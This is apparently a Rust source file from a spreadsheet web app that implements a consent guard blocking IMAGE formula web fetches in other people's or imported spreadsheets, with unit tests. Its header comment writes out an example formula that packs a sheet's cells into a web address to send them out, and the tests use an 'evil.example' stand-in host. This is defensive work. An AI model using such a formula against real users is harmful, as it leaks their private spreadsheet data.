//! External content guard, as in Excel ("Security Warning · Enable Content") and Google Sheets:
//! formulas that reach the web (today only IMAGE: the other web functions, IMPORTDATA, IMPORTHTML,
//! IMPORTXML, IMPORTFEED, IMPORTRANGE and WEBSERVICE, aren't built yet) can send a cell's data out
//! in the address they ask for (`=IMAGE("https://…/?"&TEXTJOIN(",",1,Secrets!A1:Z99))`). So in a
//! spreadsheet that isn't the person's own (someone else's file, an uploaded or imported file, a
//! copy of one), nothing is fetched until they press Allow in a slim bar under the toolbar. Until
//! then each such cell shows a small "blocked" picture. Their own spreadsheets work as before.
//!
//! The choice is remembered per person and file on the server (people/<name>.json, "external";
//! `GET|POST /api/files/<id>/external`), next to their stars and recent files; a spreadsheet not
//! yet on the server (an imported file before its first save) is decided for this tab only, and
//! carried over to the server file once it is saved. docs/privacy.md, "External content".
#![cfg_attr(not(target_arch = "wasm32"), allow(dead_code))] // the guard runs in the web app; the desktop build compiles it unused

use std::cell::RefCell;
use std::collections::HashMap;

use egui::{Frame, Margin, RichText, Ui};

use crate::{house, theme};

/// What the person decided for one open spreadsheet.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Verdict {
    /// Their own spreadsheet: fetched as before.
    Own,
    /// Waiting for the server's answer: nothing is fetched yet.
    Asking,
    /// Not theirs and not allowed: blocked, with the bar.
    Blocked,
    /// They pressed Allow.
    Allowed,
}

impl Verdict {
    fn fetches(self) -> bool {
        matches!(self, Verdict::Own | Verdict::Allowed)
    }
}

#[derive(Default)]
struct Doc {
    file: Option<String>,
    verdict: Option<Verdict>,
    /// Addresses this spreadsheet asked for while blocked (fetched on Allow).
    held: Vec<String>,
}

#[derive(Default)]
struct State {
    current: Option<u64>,
    docs: HashMap<u64, Doc>,
}

thread_local! {
    static STATE: RefCell<State> = RefCell::new(State::default());
}

/// The picture blocked cells show until the person allows external content.
pub const BLOCKED_PNG: &[u8] = include_bytes!("../icons/external-blocked.png");
/// The most addresses held per spreadsheet (a sheet listing thousands keeps the first ones).
const MAX_HELD: usize = 512;

/// Called each frame with the open spreadsheet: its uid, its file on the server (if any) and
/// whether it came from outside (opened from a file on this computer, not yet saved).
pub fn note_doc(uid: u64, file: Option<&str>, imported: bool, ctx: &egui::Context) {
    let mut ask: Option<String> = None;
    let mut tell: Option<(String, bool)> = None;
    STATE.with_borrow_mut(|s| {
        s.current = Some(uid);
        let d = s.docs.entry(uid).or_default();
        let file = file.map(str::to_string);
        if d.verdict.is_none() {
            d.verdict = Some(match &file {
                Some(id) => {
                    ask = Some(id.clone());
                    Verdict::Asking
                }
                None if imported => Verdict::Blocked,
                None => Verdict::Own,
            });
        } else if d.file != file
            && let Some(id) = &file
        {
            // Saved to the server (or saved as a copy): the new file keeps this tab's choice.
            match d.verdict {
                Some(Verdict::Blocked) => tell = Some((id.clone(), false)),
                Some(Verdict::Allowed) => tell = Some((id.clone(), true)),
                Some(Verdict::Asking) => ask = Some(id.clone()),
                _ => {}
            }
        }
        d.file = file;
    });
    #[cfg(target_arch = "wasm32")]
    {
        if let Some(id) = ask {
            server(uid, id, None, ctx.clone());
        }
        if let Some((id, allow)) = tell {
            server(uid, id, Some(allow), ctx.clone());
        }
    }
    #[cfg(not(target_arch = "wasm32"))]
    let _ = (ask, tell, ctx);
}

/// Whether the open spreadsheet may fetch from the web now.
pub fn allowed() -> bool {
    STATE.with_borrow(|s| s.current.and_then(|u| s.docs.get(&u)).and_then(|d| d.verdict).is_some_and(Verdict::fetches))
}

/// The open spreadsheet's state (for the `&test` hook and tests).
pub fn verdict() -> Option<Verdict> {
    STATE.with_borrow(|s| s.current.and_then(|u| s.docs.get(&u)).and_then(|d| d.verdict))
}

/// Keeps an address the open spreadsheet wanted while blocked; returns false if it is full.
pub fn hold(url: &str) -> bool {
    STATE.with_borrow_mut(|s| {
        let Some(d) = s.current.and_then(|u| s.docs.get_mut(&u)) else { return false };
        if d.held.iter().any(|h| h == url) {
            return true;
        }
        if d.held.len() >= MAX_HELD {
            return false;
        }
        d.held.push(url.to_string());
        true
    })
}

/// How many addresses the open spreadsheet has held back.
pub fn held_count() -> usize {
    STATE.with_borrow(|s| s.current.and_then(|u| s.docs.get(&u)).map_or(0, |d| d.held.len()))
}

/// Sets `uid`'s verdict; on allowing, hands back the addresses it held so they can be fetched.
pub fn decide(uid: u64, v: Verdict) -> Vec<String> {
    STATE.with_borrow_mut(|s| {
        let d = s.docs.entry(uid).or_default();
        d.verdict = Some(v);
        if v.fetches() { std::mem::take(&mut d.held) } else { Vec::new() }
    })
}

/// The person pressed Allow for the open spreadsheet.
pub fn allow(ctx: &egui::Context) {
    let Some((uid, file)) = STATE.with_borrow(|s| s.current.map(|u| (u, s.docs.get(&u).and_then(|d| d.file.clone())))) else { return };
    let urls = decide(uid, Verdict::Allowed);
    crate::formulaimages::fetch_now(urls, ctx);
    #[cfg(target_arch = "wasm32")]
    if let Some(id) = file {
        server(uid, id, Some(true), ctx.clone());
    }
    #[cfg(not(target_arch = "wasm32"))]
    let _ = file;
}

/// Asks the server for the person's choice for `file` (`set` None), or stores it.
#[cfg(target_arch = "wasm32")]
fn server(uid: u64, file: String, set: Option<bool>, ctx: egui::Context) {
    use crate::store::Method;
    wasm_bindgen_futures::spawn_local(async move {
        let url = format!("api/files/{}/external", crate::files::enc(&file));
        let (method, body) = match set {
            Some(on) => (Method::Post, Some(serde_json::to_vec(&serde_json::json!({ "allow": on })).unwrap_or_default())),
            None => (Method::Get, None),
        };
        let reply = crate::files::fetch(method, &url, body, None).await;
        if set.is_some() {
            return;
        }
        // Anything but a clear yes keeps it blocked (a server without accounts can't remember:
        // Allow then lasts for this tab).
        let ok = matches!(&reply, Ok((200, _, b)) if serde_json::from_slice::<serde_json::Value>(b).is_ok_and(|v| v["allowed"] == true));
        let still_asking = STATE.with_borrow(|s| s.docs.get(&uid).is_some_and(|d| d.verdict == Some(Verdict::Asking)));
        if still_asking {
            let urls = decide(uid, if ok { Verdict::Own } else { Verdict::Blocked });
            crate::formulaimages::fetch_now(urls, &ctx);
        }
        ctx.request_repaint();
    });
}

/// The slim bar under the toolbar: shown while the open spreadsheet has blocked web pictures.
pub fn bar(ui: &mut Ui) {
    if verdict() != Some(Verdict::Blocked) || held_count() == 0 {
        return;
    }
    let ctx = ui.ctx().clone();
    egui::Panel::top("starsheets_external_bar")
        .show_separator_line(false)
        .exact_size(36.0)
        .frame(Frame::NONE.fill(theme::PAGE).inner_margin(Margin { left: 12, right: 12, top: 0, bottom: 4 }))
        .show(ui, |ui| {
            Frame::NONE.fill(house::SELECTED).corner_radius(house::PANEL_RADIUS).inner_margin(Margin::symmetric(house::M as i8, house::XS as i8)).show(ui, |ui| {
                ui.set_width(ui.available_width());
                ui.horizontal_centered(|ui| {
                    if let Some(img) = crate::icons::icon("image") {
                        ui.add(img.fit_to_exact_size(egui::vec2(16.0, 16.0)));
                    }
                    ui.label(RichText::new("External content is blocked").size(house::BODY).color(theme::TEXT))
                        .on_hover_text("Pictures from web addresses (IMAGE) aren't loaded in a spreadsheet that isn't yours until you allow it: the address could carry the sheet's data to that site.");
                    ui.label(RichText::new("·").size(house::BODY).color(theme::TEXT_DIM));
                    let b = ui.add(egui::Button::new(RichText::new("Allow").size(house::BODY).color(house::BLUE).strong()).frame(false));
                    if b.on_hover_text("Load web pictures in this spreadsheet (remembered for this file)").clicked() {
                        allow(&ctx);
                    }
                });
            });
        });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn reset() {
        STATE.with_borrow_mut(|s| *s = State::default());
    }

    #[test]
    fn own_new_spreadsheets_fetch_as_before() {
        reset();
        let ctx = egui::Context::default();
        note_doc(1, None, false, &ctx);
        assert_eq!(verdict(), Some(Verdict::Own));
        assert!(allowed());
    }

    #[test]
    fn imported_spreadsheets_are_blocked_until_allowed_and_keep_the_choice() {
        reset();
        let ctx = egui::Context::default();
        note_doc(2, None, true, &ctx);
        assert!(!allowed(), "nothing fetched before consent");
        assert!(hold("https://evil.example/?a=1"));
        assert!(hold("https://evil.example/?a=1"), "held once");
        assert_eq!(held_count(), 1);
        // Another spreadsheet in between doesn't change this one's choice.
        note_doc(3, None, false, &ctx);
        assert!(allowed());
        note_doc(2, None, true, &ctx);
        assert!(!allowed());
        let urls = decide(2, Verdict::Allowed);
        assert_eq!(urls, vec!["https://evil.example/?a=1".to_string()]);
        assert!(allowed());
        // Saved to the server later: still allowed, not asked again.
        note_doc(2, None, true, &ctx);
        assert_eq!(verdict(), Some(Verdict::Allowed));
    }

    #[test]
    fn files_on_the_server_wait_for_its_answer() {
        reset();
        let ctx = egui::Context::default();
        note_doc(4, Some("abc"), false, &ctx);
        assert_eq!(verdict(), Some(Verdict::Asking));
        assert!(!allowed(), "blocked while asking");
        assert!(hold("https://x.example/p.png"));
        assert!(decide(4, Verdict::Blocked).is_empty());
        assert!(!allowed());
    }
}
